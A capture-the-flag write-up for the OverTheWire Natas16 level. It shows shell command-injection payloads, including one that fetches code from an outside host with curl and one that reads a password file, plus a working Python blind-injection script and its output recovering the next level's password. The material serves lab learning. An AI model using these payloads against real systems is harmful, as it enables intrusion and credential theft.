# Natas16

*	user: `natas16`
*	pass: `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`
*	url: `http://natas16.natas.labs.overthewire.org`
*	flag: `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`

## Procedure

1.	Our objective is to get the content of file `/etc/natas_webpass/natas17`.

1.	Similarly to Natas9 and Natas10, there is a BASH script to be
	injected. Even if a security check is performed to identify
	some "special" characters, `$`, `(` and `)` are allowed...

2.	Firstly, we can try to load the code to be injected from an external
	resource by passing as value of `needle` parameter the following
	string

		$(curl -s http://www.example.com/code_to_inject.txt)

	where `code_to_inject.txt` could contain something like

		Africans" dictionary.txt ; cat /etc/natas_webpass/natas17 ; grep -i "Africans

	Unfortunately, this way seems to be not followable (probably due to
	security settings on target machine).

3.	Let's try a brute-force approach (like Natas15). Our idea is to
	create a switch that informs us whether a token is present in the
	flag.

4.	If we try to check existence of `Africans` we receive the following
	result

		$ curl -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh -d "needle=Africans" http://natas16.natas.labs.overthewire.org
		[cut]
		<pre>
		Africans
		</pre>
		[cut]

	while with `XAfricans` we receive

		$ curl -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh -d "needle=XAfricans" http://natas16.natas.labs.overthewire.org
		[cut]
		<pre>
		</pre>
		[cut]

	The base idea of our switch is to check the string `XAfricans` where
	`X` could be `NULL`. In this way, we'll have two states.

5.	`X` will be the result of

		grep -E ^<token>.* /etc/natas_webpass/natas17

	Indeed, if `token` is at the beginning of password, value of `token`
	will be shown. Otherwise, nothing is shown.

6.	Our brute-force consists in assigning to `needle` the iteration (over
	the charset `A-Za-z0-9`) of the following command

		$(grep -E ^<token>.* /etc/natas_webpass/natas17)Africans

	Of course, Python will help us

		import requests

		target = 'http://natas16.natas.labs.overthewire.org'
		charset_0 = (
			'0123456789' +
			'abcdefghijklmnopqrstuvwxyz' +
			'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
		)

		p = ''
		i = 0
		while len(p) != 32:
			while i < len(charset_0):
				c = charset_0[i]
				needle = ('$(grep -E ^%s%c.* /etc/natas_webpass/natas17)Africans' % (p, c))
				r = requests.get(target,
					auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
					params={"needle": needle}
				)
				if "Africans" not in r.text:
					p += c
					print ('P: ' + p.ljust(32, '*'))
					i = 0
				else:
					i += 1

7.	This is the final result

		$ python natas16.py
		P: 8*******************************
		...
		P: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9**
		P: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c*
		P: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
